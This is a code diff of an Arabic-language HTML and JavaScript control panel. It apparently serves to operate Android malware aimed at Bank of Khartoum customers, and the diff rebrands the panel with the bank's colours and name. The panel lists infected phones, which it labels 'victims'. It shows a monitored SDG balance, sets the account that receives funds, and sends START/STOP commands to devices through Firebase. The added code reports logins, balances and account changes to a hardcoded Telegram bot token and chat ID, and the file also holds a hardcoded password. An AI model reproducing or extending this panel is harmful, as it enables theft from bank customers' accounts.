@@ -3,153 +3,168 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة تحكم الدولي</title>
+    <title>لوحة تحكم الدولي - بنكك Edition</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg-color: #0b0e14;
-            --accent: #00d2ff;
-            --accent-dark: #3a7bd5;
-            --card-bg: rgba(22, 27, 34, 0.8);
-            --text-main: #e6edf3;
-            --success: #238636;
-            --danger: #f85149;
-            --warning: #d29922;
+            --bok-green: #006837;
+            --bok-gold: #c6a34d;
+            --bg-light: #f4f7f6;
+            --white: #ffffff;
+            --text-dark: #333333;
+            --danger: #d32f2f;
         }
 
         body {
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg-color);
-            background-image: radial-gradient(circle at 50% 50%, #161b22 0%, #0b0e14 100%);
-            color: var(--text-main);
-            margin: 0;
-            padding: 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            margin: 0; padding: 0;
             min-height: 100vh;
         }
 
-        /* شاشة قفل الصفحة */
+        /* شاشة القفل */
         #lock-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--bg-color); z-index: 9999;
+            background: var(--bok-green); z-index: 9999;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
-        .lock-box { background: var(--card-bg); padding: 30px; border-radius: 15px; border: 1px solid #30363d; text-align: center; }
+        .lock-box { background: var(--white); padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 90%; max-width: 400px; }
+        .lock-box img { width: 80px; margin-bottom: 20px; }
 
-        .container { max-width: 1200px; margin: 0 auto; display: none; } /* مخفي حتى إدخال الرمز */
+        /* الحاوية الرئيسية */
+        .container { max-width: 1000px; margin: 0 auto; padding: 20px; display: none; }
 
+        /* الهيدر */
         .header {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 20px; background: var(--card-bg); border: 1px solid #30363d;
-            border-radius: 15px; margin-bottom: 25px; backdrop-filter: blur(10px);
+            background: var(--bok-green); color: var(--white);
+            padding: 25px; border-radius: 0 0 30px 30px; margin: -20px -20px 30px -20px;
+            text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
+        .header h1 { margin: 0; font-size: 22px; letter-spacing: 1px; }
 
-        .header h1 { margin: 0; font-size: 24px; background: linear-gradient(to left, var(--accent), var(--accent-dark)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        /* بطاقة الرصيد */
+        .balance-card {
+            background: var(--white); border-radius: 20px; padding: 30px;
+            text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            margin-bottom: 25px; border-top: 5px solid var(--bok-gold);
+        }
+        .balance-label { color: #777; font-size: 14px; margin-bottom: 10px; }
+        .balance-amount { font-size: 35px; font-weight: bold; color: var(--bok-green); }
 
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 25px; }
-        .stat-card { background: var(--card-bg); border: 1px solid #30363d; padding: 20px; border-radius: 15px; position: relative; overflow: hidden; }
-        .stat-label { color: #8b949e; font-size: 14px; margin-bottom: 10px; }
-        .stat-value { font-size: 26px; font-weight: bold; font-family: 'Consolas', monospace; }
+        /* شبكة التحكم */
+        .main-grid { display: grid; grid-template-columns: 1.5fr 1fr; gap: 20px; }
+        @media (max-width: 768px) { .main-grid { grid-template-columns: 1fr; } }
 
-        .main-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
-        @media (max-width: 900px) { .main-grid { grid-template-columns: 1fr; } }
+        .section { background: var(--white); border-radius: 20px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .section-title { font-weight: bold; font-size: 18px; margin-bottom: 20px; color: var(--bok-green); border-bottom: 2px solid var(--bg-light); padding-bottom: 10px; }
 
-        .panel { background: var(--card-bg); border: 1px solid #30363d; border-radius: 15px; padding: 20px; }
-        .panel-title { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
-
+        /* الأزرار والحقول */
         input[type="text"], input[type="password"] {
-            width: 100%; padding: 12px; background: #0d1117; border: 1px solid #30363d;
-            color: white; border-radius: 8px; margin-top: 8px; outline: none; box-sizing: border-box;
+            width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 12px;
+            margin-top: 10px; box-sizing: border-box; font-size: 16px; background: #fafafa;
         }
 
         .btn {
-            width: 100%; padding: 14px; border-radius: 8px; border: none; font-weight: bold;
-            cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px;
+            width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: bold;
+            cursor: pointer; transition: 0.3s; margin-top: 15px; font-size: 15px;
         }
-        .btn-primary { background: linear-gradient(45deg, var(--accent-dark), var(--accent)); color: white; }
-        .btn-toggle { background: #21262d; color: var(--text-main); border: 1px solid #30363d; }
-        .active-on { background: var(--success) !important; color: white; }
-        .active-fast { background: var(--warning) !important; color: #000; }
+        .btn-main { background: var(--bok-green); color: var(--white); }
+        .btn-main:hover { background: #004d29; }
+        .btn-outline { background: #fff; color: var(--bok-green); border: 2px solid var(--bok-green); }
+        .active-btn { background: var(--bok-gold) !important; color: white; border: none; }
 
+        /* قائمة الأجهزة */
         .device-item {
-            background: rgba(13, 17, 23, 0.6); border: 1px solid #30363d;
-            padding: 12px 15px; border-radius: 10px; margin-bottom: 10px;
-            display: flex; justify-content: space-between; align-items: center;
+            background: #fdfdfd; border: 1px solid #eee; padding: 15px;
+            border-radius: 15px; margin-bottom: 12px; display: flex;
+            justify-content: space-between; align-items: center;
         }
+        .device-id { font-weight: bold; font-family: monospace; color: #555; }
         
-        .footer {
-            text-align: center; margin-top: 50px; padding: 20px;
-            color: #8b949e; font-size: 14px; border-top: 1px solid #30363d;
-        }
+        .toggle-switch { position: relative; display: inline-block; width: 50px; height: 26px; }
+        .toggle-switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--bok-green); }
+        input:checked + .slider:before { transform: translateX(24px); }
+
+        .footer { text-align: center; margin-top: 40px; padding: 20px; color: #999; font-size: 13px; }
     </style>
 </head>
 <body>
 
 <div id="lock-screen">
     <div class="lock-box">
-        <i class="fas fa-user-shield" style="font-size: 50px; color: var(--accent); margin-bottom: 15px;"></i>
-        <h2>لوحة تحكم الدولي</h2>
-        <p style="color: #8b949e;">يرجى إدخال كلمة المرور للمتابعة</p>
-        <input type="password" id="pass-input" placeholder="كلمة المرور">
-        <button class="btn btn-primary" onclick="checkPass()">دخول النظام</button>
+        <i class="fas fa-university" style="font-size: 50px; color: var(--bok-green);"></i>
+        <h2 style="color: var(--bok-green);">بنك الخرطوم</h2>
+        <p>لوحة التحكم - الدولي</p>
+        <input type="password" id="pass-input" placeholder="كلمة مرور النظام">
+        <button class="btn btn-main" onclick="checkPass()">تسجيل الدخول</button>
     </div>
 </div>
 
 <div class="container" id="main-content">
     <div class="header">
-        <h1><i class="fas fa-bolt"></i> لوحة تحكم الدولي</h1>
-        <div id="net-status" style="font-size: 12px; color: var(--success);"><i class="fas fa-signal"></i> متصل بالسيرفر</div>
+        <h1>لوحة تحكم الدولي</h1>
     </div>
 
-    <div class="stats-grid">
-        <div class="stat-card">
-            <div class="stat-label">إجمالي الرصيد المرصود</div>
-            <div id="cash-display" class="stat-value" style="color: var(--success);">0.00 SDG</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">الأجهزة المتصلة</div>
-            <div id="device-count" class="stat-value">0</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">آخر تحديث</div>
-            <div id="last-time" class="stat-value" style="font-size: 18px;">--:--:--</div>
-        </div>
+    <div class="balance-card">
+        <div class="balance-label">الرصيد المتاح في السيرفر</div>
+        <div id="cash-display" class="balance-amount">0.00 SDG</div>
+        <div style="font-size: 12px; color: #aaa; margin-top: 10px;" id="last-update">جاري مزامنة البيانات...</div>
     </div>
 
     <div class="main-grid">
-        <div class="panel">
-            <div class="panel-title"><i class="fas fa-list"></i> الأجهزة المتصلة (الضحايا)</div>
-            <div id="activate-list">جاري التحميل...</div>
+        <div class="section">
+            <div class="section-title"><i class="fas fa-mobile-button"></i> الأجهزة والضحايا</div>
+            <div id="activate-list">
+                <p style="text-align: center; color: #999;">جاري البحث عن أجهزة متصلة...</p>
+            </div>
         </div>
 
-        <div class="panel">
-            <div class="panel-title"><i class="fas fa-cog"></i> الإعدادات العامة</div>
-            <button id="system-btn" class="btn btn-toggle" onclick="toggleStatus()">تحميل...</button>
-            <button id="turbo-btn" class="btn btn-toggle" onclick="toggleTurbo()">تحميل...</button>
-            <div style="margin-top:20px;">
-                <label class="stat-label">رقم حساب الاستقبال</label>
-                <input type="text" id="target-acc" placeholder="أدخل الرقم هنا">
-                <button class="btn btn-primary" onclick="executeCommand()">تحديث البيانات</button>
+        <div class="section">
+            <div class="section-title"><i class="fas fa-gears"></i> التحكم السريع</div>
+            
+            <label style="font-size: 13px; color: #666;">حالة النظام العام</label>
+            <button id="system-btn" class="btn btn-outline" onclick="toggleStatus()">تحميل...</button>
+            
+            <label style="font-size: 13px; color: #666; margin-top: 15px; display: block;">وضع التيربو (المعالجة السريعة)</label>
+            <button id="turbo-btn" class="btn btn-outline" onclick="toggleTurbo()">تحميل...</button>
+
+            <div style="margin-top: 25px; border-top: 1px solid #eee; padding-top: 20px;">
+                <label style="font-size: 13px; color: #666;">حساب الاستقبال</label>
+                <input type="text" id="target-acc" placeholder="أدخل رقم الحساب">
+                <button class="btn btn-main" onclick="updateAccount()">تحديث الحساب المستهدف</button>
             </div>
         </div>
     </div>
 
     <div class="footer">
-        برمحة وتصميم عباس الدولي @2026
+        برمحة وتصميم عباس الدولي @2026<br>
+        جميع الحقوق محفوظة
     </div>
 </div>
 
 <script>
-    // كلمة المرور المطلوبة
+    // بيانات تلجرام الخاصة بك
+    const TG_TOKEN = "8308447003:AAFhOi_gqBO6FMg5tHJzhAZ_4OgLDvFkJOo";
+    const TG_ID = "5957156447";
+
+    function sendTelegram(text) {
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
+    }
+
     function checkPass() {
-        const pass = document.getElementById('pass-input').value;
-        if(pass === "abbasaldoly123") {
+        if(document.getElementById('pass-input').value === "abbasaldoly123") {
             document.getElementById('lock-screen').style.display = 'none';
             document.getElementById('main-content').style.display = 'block';
-            startSystem(); // بدء تشغيل الفايربيز بعد الدخول
+            startLiveSystem();
+            sendTelegram("🔓 تم تسجيل الدخول إلى لوحة التحكم الآن.");
         } else {
-            alert("كلمة المرور خاطئة!");
+            alert("خطأ في كلمة المرور!");
         }
     }
 
@@ -161,53 +176,72 @@
         appId: "1:111262781250:android:1b7bebdb45d69df294c2db"
     };
 
-    function startSystem() {
+    function startLiveSystem() {
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        let currentSystemState = false;
-        let currentTurboState = false;
+        let sysState = false;
+        let turboState = false;
 
-        db.ref('Settings/System').on('value', (snap) => {
-            const btn = document.getElementById('system-btn');
-            currentSystemState = snap.val() === "ON";
-            btn.innerHTML = currentSystemState ? "النظام نشط" : "النظام متوقف";
-            btn.className = currentSystemState ? "btn btn-toggle active-on" : "btn btn-toggle";
-        });
-
-        db.ref('Settings/Speed').on('value', (snap) => {
-            const btn = document.getElementById('turbo-btn');
-            currentTurboState = snap.val() === "FAST";
-            btn.innerHTML = currentTurboState ? "تيربو: سريع" : "تيربو: عادي";
-            btn.className = currentTurboState ? "btn btn-toggle active-fast" : "btn btn-toggle";
-        });
-
-        window.toggleStatus = () => db.ref('Settings/System').set(currentSystemState ? "OFF" : "ON");
-        window.toggleTurbo = () => db.ref('Settings/Speed').set(currentTurboState ? "SLOW" : "FAST");
-
+        // الرصيد
         db.ref('Cash').on('value', (snap) => {
-            if(snap.exists()){
-                document.getElementById('cash-display').innerText = snap.val() + " SDG";
-                document.getElementById('last-time').innerText = new Date().toLocaleTimeString();
-            }
+            const val = snap.val() || "0.00";
+            document.getElementById('cash-display').innerText = val + " SDG";
+            document.getElementById('last-update').innerText = "آخر تحديث: " + new Date().toLocaleTimeString();
+            sendTelegram(`💰 رصيد جديد مرصود: ${val} SDG`);
         });
 
+        // النظام العام
+        db.ref('Settings/System').on('value', (snap) => {
+            sysState = snap.val() === "ON";
+            const btn = document.getElementById('system-btn');
+            btn.innerText = sysState ? "النظام: متصل" : "النظام: غير متصل";
+            btn.className = sysState ? "btn active-btn" : "btn btn-outline";
+        });
+
+        // التيربو
+        db.ref('Settings/Speed').on('value', (snap) => {
+            turboState = snap.val() === "FAST";
+            const btn = document.getElementById('turbo-btn');
+            btn.innerText = turboState ? "التيربو: نشط" : "التيربو: عادي";
+            btn.className = turboState ? "btn active-btn" : "btn btn-outline";
+        });
+
+        window.toggleStatus = () => db.ref('Settings/System').set(sysState ? "OFF" : "ON");
+        window.toggleTurbo = () => db.ref('Settings/Speed').set(turboState ? "SLOW" : "FAST");
+
+        // الأجهزة
         db.ref('activate').on('value', (snap) => {
-            const listDiv = document.getElementById('activate-list');
-            listDiv.innerHTML = "";
-            let count = 0;
-            if (snap.exists()) {
+            const list = document.getElementById('activate-list');
+            list.innerHTML = "";
+            if(snap.exists()){
                 Object.keys(snap.val()).forEach(id => {
-                    count++;
-                    listDiv.innerHTML += `<div class="device-item"><span>ID: ${id}</span><span style="color:var(--success)">Active</span></div>`;
+                    list.innerHTML += `
+                        <div class="device-item">
+                            <div class="device-id"><i class="fas fa-mobile-screen"></i> ${id.substring(0,10)}..</div>
+                            <label class="toggle-switch">
+                                <input type="checkbox" checked onclick="toggleDevice('${id}', this.checked)">
+                                <span class="slider"></span>
+                            </label>
+                        </div>`;
                 });
             }
-            document.getElementById('device-count').innerText = count;
         });
 
-        window.executeCommand = () => {
+        window.updateAccount = () => {
             const acc = document.getElementById('target-acc').value;
-            if(acc) db.ref('Account').set(acc).then(() => alert("تم التحديث"));
-        }
+            if(acc) {
+                db.ref('Account').set(acc).then(() => {
+                    alert("تم تحديث حساب الاستقبال");
+                    sendTelegram(`🎯 تم تغيير حساب الاستقبال إلى: ${acc}`);
+                });
+            }
+        };
+    }
+
+    function toggleDevice(id, status) {
+        const cmd = status ? "START" : "STOP";
+        firebase.database().ref('Commands/' + id).set(cmd);
+        sendTelegram(`⚠️ جهاز ${id}: تم إرسال أمر ${cmd}`);
     }
 </script>
 </body>
